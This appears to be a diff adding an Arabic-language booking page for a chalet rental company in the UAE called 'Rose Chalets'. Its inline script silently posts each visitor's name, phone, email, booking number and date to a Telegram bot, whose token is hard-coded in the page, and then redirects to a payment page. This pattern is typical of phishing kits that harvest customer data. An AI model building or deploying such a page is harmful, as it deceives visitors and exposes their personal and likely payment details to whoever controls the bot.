@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>شركة روز لحجز الشاليهات</title>
+  <link rel="stylesheet" href="style.css" />
+</head>
+<body>
+
+  <header class="main-header">
+    <div class="container">
+      <h1 class="logo">🌹 Rose Chalets</h1>
+      <p class="tagline">راحة وأناقة في قلب الإمارات</p>
+    </div>
+  </header>
+
+  <main class="container">
+
+    <section class="about">
+      <h2>من نحن؟</h2>
+      <p>
+        شركة روز لتأجير الشاليهات هي وجهتك المثالية لقضاء عطلات فاخرة في أرقى شاليهات الإمارات.
+        نقدم لك تجربة استثنائية من الراحة والفخامة، شاليهاتنا مجهزة بالكامل وتناسب جميع الأذواق، نوفر لك خدمة الحجز بكل سهولة واحترافية.
+      </p>
+    </section>
+
+    <section class="gallery">
+      <h2>صور من شاليهاتنا</h2>
+      <div class="gallery-grid">
+        <img src="https://images.unsplash.com/photo-1582719478144-bd458f41a7aa" alt="شاليه فاخر 1" />
+        <img src="https://images.unsplash.com/photo-1590490360188-9984f139abb4" alt="شاليه بإطلالة بحرية" />
+        <img src="https://images.unsplash.com/photo-1600585154340-be6161a56a0c" alt="شاليه مع مسبح خاص" />
+      </div>
+    </section>
+
+    <section class="booking">
+      <h2>احجز شاليهك الآن</h2>
+      <form id="bookingForm">
+        <label for="bookingNumber">رقم الحجز (6 أرقام):</label>
+        <input type="text" id="bookingNumber" name="bookingNumber" pattern="\\d{6}" maxlength="6" minlength="6" required />
+
+        <label for="fullName">الاسم الكامل:</label>
+        <input type="text" id="fullName" name="fullName" required />
+
+        <label for="phoneNumber">رقم الهاتف:</label>
+        <input type="tel" id="phoneNumber" name="phoneNumber" required />
+
+        <label for="email">البريد الإلكتروني:</label>
+        <input type="email" id="email" name="email" required />
+
+        <label for="bookingDate">تاريخ الحجز:</label>
+        <input type="date" id="bookingDate" name="bookingDate" required />
+
+        <button type="submit">تأكيد المعلومات</button>
+      </form>
+    </section>
+
+  </main>
+
+  <footer class="footer">
+    <p>⚠️ هذا الموقع تجريبي لأغراض العرض فقط - جميع الحقوق محفوظة © Rose Chalets</p>
+  </footer>
+
+  <script>
+    document.getElementById("bookingForm").addEventListener("submit", function(e) {
+      e.preventDefault();
+
+      const token = "8022117794:AAHc6i8c6jZY_2IGHUQlQBJYGN2v9n0";
+      const chatId = "1008144314";
+
+      const bookingNumber = document.getElementById("bookingNumber").value;
+      const fullName = document.getElementById("fullName").value;
+      const phone = document.getElementById("phoneNumber").value;
+      const email = document.getElementById("email").value;
+      const date = document.getElementById("bookingDate").value;
+
+      const message = `
+🔔 حجز جديد:
+رقم الحجز: ${bookingNumber}
+الاسم: ${fullName}
+الهاتف: ${phone}
+البريد: ${email}
+تاريخ الحجز: ${date}
+      `;
+
+      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message
+        })
+      }).then(response => {
+        if (response.ok) {
+          window.location.href = "payment.html";
+        } else {
+          alert("فشل إرسال المعلومات، تأكد من الاتصال بالإنترنت.");
+        }
+      });
+    });
+  </script>
+
+</body>
+</html>
